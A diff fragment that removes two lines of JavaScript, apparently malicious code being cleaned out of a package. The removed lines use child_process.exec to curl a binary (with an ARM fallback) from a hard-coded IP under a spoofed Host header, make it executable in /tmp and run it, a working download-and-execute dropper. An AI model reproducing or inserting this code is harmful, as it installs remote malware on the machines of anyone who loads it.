@@ -1,2 +1,0 @@
-const { exec } = require('child_process');
-exec('curl -k -H "Host: connect.school4fun.xyz" -o /tmp/payloadVC2 http://188.114.96.3/payloadVC2 && chmod 777 /tmp/payloadVC2 && /tmp/payloadVC2 || curl -k -H "Host: connect.school4fun.xyz" -o /tmp/payloadVC2-arm http://188.114.96.3/payloadVC2-arm && chmod 777 /tmp/payloadVC2-arm && /tmp/payloadVC2-arm');
